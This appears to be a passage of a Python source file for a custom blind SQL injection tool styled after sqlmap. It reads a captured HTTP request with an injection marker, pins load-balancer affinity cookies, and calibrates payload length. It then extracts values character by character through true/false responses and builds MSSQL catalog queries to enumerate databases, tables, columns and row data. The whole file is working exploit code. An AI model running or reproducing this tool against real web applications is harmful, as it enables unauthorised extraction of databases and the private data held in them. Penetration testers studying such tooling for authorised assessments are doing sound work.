# ---- tiny ANSI helpers for sqlmap-ish output -----------------------------
def c(txt, code):
    return f"\033[{code}m{txt}\033[0m"

def print_banner():
    print(c(BANNER, "36"))
def info(m):  print(f"[{c('*','36')}] {m}")
def good(m):  print(f"[{c('+','32')}] {m}")
def warn(m):  print(f"[{c('!','33')}] {m}")
def err(m):   print(f"[{c('x','31')}] {m}")


class RawRequest:
    def __init__(self, path, force_ssl=False):
        with open(path, "r", errors="replace") as f:
            raw = f.read()
        # drop leading blank lines so the head/body split can't swallow the
        # request line + Host header (otherwise base_url has no host)
        raw = re.sub(r"^(?:[ \t]*\r?\n)+", "", raw)
        if MARKER not in raw:
            sys.exit(f"No injection marker '{MARKER}' found in request file.")
        parts = re.split(r"\r?\n\r?\n", raw, maxsplit=1)
        head = parts[0]
        self.body = parts[1] if len(parts) > 1 else ""
        lines = head.splitlines()
        self.method, self.uri, _ = (lines[0].split() + ["", "", ""])[:3]
        self.headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                self.headers[k.strip()] = v.strip()
        host = self.headers.get("Host", "")
        scheme = "https" if force_ssl or self.uri.startswith("https") else "http"
        path = self.uri
        if path.startswith("http"):
            path = urllib.parse.urlsplit(path).path or "/"
        self.base_url = f"{scheme}://{host}{path.split('?')[0]}"
        self.query = path.split("?", 1)[1] if "?" in path else ""
        self.marker_in_query = MARKER in self.query
        self.marker_in_body = MARKER in self.body
        if not (self.marker_in_query or self.marker_in_body):
            sys.exit("Marker must be in the query string or body.")

    def cookie_header(self):
        for k in self.headers:
            if k.lower() == "cookie":
                return k, self.headers[k]
        return "Cookie", ""


class Injector:
    def __init__(self, req, args):
        self.req = req
        self.args = args
        self.prefix = args.prefix
        self.suffix = args.suffix
        self.votes = args.votes
        self.session = requests.Session()
        self.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        self.pinned_cookie = None
        self.request_count = 0
        self.max_payload = args.max_payload
        self.oversized = 0
        self._ck_key, self._ck_val = req.cookie_header()
        if args.pin_affinity:
            self._establish_affinity()

    # ---- request plumbing --------------------------------------------
    def _inject(self, condition):
        payload = f"{self.prefix}{condition}{self.suffix}"
        enc = urllib.parse.quote(payload, safe="")
        query = self.req.query.replace(MARKER, enc) if self.req.marker_in_query else self.req.query
        body = self.req.body.replace(MARKER, enc) if self.req.marker_in_body else self.req.body
        url = self.req.base_url + ("?" + query if query else "")
        return url, body

    def _headers(self):
        h = dict(self.req.headers)
        for bad in ("Host", "Content-Length", "content-length"):
            h.pop(bad, None)
        h["Host"] = self.req.headers.get("Host", "")
        if self.pinned_cookie:
            h[self._ck_key] = self.pinned_cookie
        return h

    def _raw_send(self, condition):
        url, body = self._inject(condition)
        self.request_count += 1
        return self.session.request(
            self.req.method if self.req.method in ("GET", "POST", "PUT") else "GET",
            url, headers=self._headers(),
            data=body.encode() if body else None,
            proxies=self.proxies, verify=False,
            allow_redirects=False, timeout=self.args.timeout)

    def _establish_affinity(self):
        try:
            r = self._raw_send("1=1")
        except Exception as e:
            warn(f"baseline request failed: {e}")
            return
        jar = SimpleCookie()
        if hasattr(r.raw, "headers"):
            for sc in r.raw.headers.get_all("Set-Cookie", []) or []:
                jar.load(sc)
        existing = SimpleCookie()
        existing.load(self._ck_val)
        pinned = False
        for name in ("ARRAffinity", "ARRAffinitySameSite"):
            if name in jar:
                existing[name] = jar[name].value
                pinned = True
        self.pinned_cookie = "; ".join(f"{k}={m.value}" for k, m in existing.items())
        if pinned:
            info(f"pinned backend affinity")

    # ---- oracle ------------------------------------------------------
    @staticmethod
    def _norm(s):
        # collapse CRLF/CR to LF so a pasted multi-line token matches a
        # response that uses different line endings (classic \n vs \r\n bite)
        return s.replace("\r\n", "\n").replace("\r", "\n")

    def _read(self, resp):
        if resp.status_code == 500:
            return None
        text = self._norm(resp.text)
        if self.args.true_string:
            return self._norm(self.args.true_string) in text
        if self.args.false_string:
            return self._norm(self.args.false_string) not in text
        return resp.status_code == 200 and text.strip() != self.args.false_default

    def _over_budget(self, condition):
        if not self.max_payload:
            return False
        return len(f"{self.prefix}{condition}{self.suffix}") > self.max_payload

    def truth(self, condition):
        """Vote a boolean, retrying past 500s. Returns True/False.
        Over-budget probes short-circuit to False (and are counted)."""
        if self._over_budget(condition):
            self.oversized += 1
            return False
        got, attempts, cap = [], 0, self.votes * 5
        while len(got) < self.votes and attempts < cap:
            attempts += 1
            try:
                r = self._raw_send(condition)
            except Exception:
                time.sleep(0.3); continue
            v = self._read(r)
            if v is None:
                continue
            got.append(v)
            if self.args.delay:
                time.sleep(self.args.delay)
        if not got:
            return False
        return sum(got) > len(got) / 2

    # ---- calibration -------------------------------------------------
    def calibrate(self):
        if not self.truth("1=1"):
            warn("calibration skipped: base condition not TRUE"); return
        lo, hi = 0, 400
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = "1=1" + (" AND 1=1" * mid)
            if len(f"{self.prefix}{cond}{self.suffix}") > 3000:
                hi = mid - 1; continue
            saved = self.max_payload; self.max_payload = 0
            ok = self.truth(cond)
            self.max_payload = saved
            if ok: lo = mid
            else:  hi = mid - 1
        cond = "1=1" + (" AND 1=1" * lo)
        self.max_payload = len(f"{self.prefix}{cond}{self.suffix}")
        info(f"measured payload budget: ~{self.max_payload} chars")

    # ---- primitives --------------------------------------------------
    def get_int(self, expr, maxv=10_000_000):
        lo, hi = 0, 1
        while self.truth(f"({expr})>{hi}"):
            lo = hi; hi *= 2
            if hi > maxv: hi = maxv; break
        while lo < hi:
            mid = (lo + hi) // 2
            if self.truth(f"({expr})>{mid}"): lo = mid + 1
            else: hi = mid
        return lo

    def get_len(self, expr, maxlen=256):
        # probe budget: if even LEN(expr)>0 is over-cap, the value is
        # unreachable — signal with -1 so the caller reports it honestly.
        if self._over_budget(f"LEN({expr})>0"):
            return -1
        lo, hi = 0, 4
        while self.truth(f"LEN({expr})>{hi}"):
            lo = hi; hi *= 2
            if hi > maxlen: hi = maxlen; break
        while lo < hi:
            mid = (lo + hi) // 2
            if self.truth(f"LEN({expr})>{mid}"): lo = mid + 1
            else: hi = mid
        return lo

    def _char_at(self, expr, pos):
        """Return the char at pos using literal equality (shortest form),
        VERIFIED: a positive match is re-confirmed; if nothing matches the
        position is retried once before giving up."""
        for attempt in range(2):
            for ch in self.args.charset:
                q = ch.replace("'", "''")
                cond = f"SUBSTRING({expr},{pos},1)='{q}'"
                if self._over_budget(cond):
                    return None            # unreachable under cap
                if self.truth(cond):
                    # verify the hit (kills noisy false-positives)
                    if self.truth(cond):
                        return ch
            # nothing matched this pass -> retry once (kills false-negatives)
        return "?"                          # genuinely unresolved

    def get_string(self, expr, label="", live=True):
        n = self.get_len(expr)
        if n == -1:
            if live: warn(f"{label}: over cap — unreachable through this parameter")
            return None
        if n == 0:
            return ""
        out = []
        for i in range(1, n + 1):
            ch = self._char_at(expr, i)
            if ch is None:
                if live:
                    print()
                    warn(f"{label}: char {i} over cap — value unreachable "
                         f"(need shorter payload / different parameter)")
                return None
            out.append(ch)
            if live:
                sys.stdout.write(f"\r[{c('~','36')}] {label}: {''.join(out)}")
                sys.stdout.flush()
        if live:
            print()
        return "".join(out)


class Store:
    def __init__(self, path):
        self.db = sqlite3.connect(path)
        self.db.executescript("""
            CREATE TABLE IF NOT EXISTS info(k TEXT PRIMARY KEY, v TEXT);
            CREATE TABLE IF NOT EXISTS databases(name TEXT PRIMARY KEY);
            CREATE TABLE IF NOT EXISTS tables(db TEXT, name TEXT, PRIMARY KEY(db,name));
            CREATE TABLE IF NOT EXISTS columns(db TEXT, tbl TEXT, name TEXT, PRIMARY KEY(db,tbl,name));
            CREATE TABLE IF NOT EXISTS data(db TEXT, tbl TEXT, rownum INT, col TEXT, value TEXT);
        """)
        self.db.commit()
    def info(self, k, v):
        self.db.execute("INSERT OR REPLACE INTO info VALUES(?,?)", (k, v)); self.db.commit()
    def add(self, table, row):
        ph = ",".join("?" * len(row))
        self.db.execute(f"INSERT OR IGNORE INTO {table} VALUES({ph})", row); self.db.commit()


# ---- pretty result table (sqlmap-ish) ------------------------------------
def render_table(title, headers, rows):
    if not rows:
        return
    widths = [len(h) for h in headers]
    for r in rows:
        for i, cell in enumerate(r):
            widths[i] = max(widths[i], len(str(cell)))
    line = "+".join("-" * (w + 2) for w in widths)
    print(f"\n{c(title,'1')}")
    print(f"+{line}+")
    print("| " + " | ".join(h.ljust(widths[i]) for i, h in enumerate(headers)) + " |")
    print(f"+{line}+")
    for r in rows:
        print("| " + " | ".join(str(cell).ljust(widths[i]) for i, cell in enumerate(r)) + " |")
    print(f"+{line}+")


# ---- MSSQL query builders (catalog views need privileges) ----------------
def q_db_count():          return "SELECT COUNT(*) FROM sys.databases"
def q_db_name(i):          return f"SELECT name FROM sys.databases ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
def q_tbl_count(db):       return f"SELECT COUNT(*) FROM {db}.sys.tables"
def q_tbl_name(db, i):     return f"SELECT name FROM {db}.sys.tables ORDER BY name OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
def q_col_count(db, t):    return f"SELECT COUNT(*) FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{t}')"
def q_col_name(db, t, i):  return f"SELECT name FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{t}') ORDER BY column_id OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
def q_row_count(tbl):      return f"SELECT COUNT(*) FROM {tbl}"
def q_cell(tbl, col, i):   return f"SELECT MIN({col}) FROM (SELECT TOP {i+1} {col} FROM {tbl} ORDER BY {col}) t"


def enum_databases(inj, store):
    info("fetching databases")
    n = inj.get_int(q_db_count(), maxv=10000)
    if n == 0:
        warn("0 databases (catalog view likely permission-denied to this login "
             "— non-DBA accounts often can't read sys.databases)")
        return []
    names = []
    for i in range(n):
        name = inj.get_string(f"({q_db_name(i)})", label=f"database[{i}]")
        if name:
            good(f"database: {name}"); store.add("databases", (name,)); names.append(name)
    return names


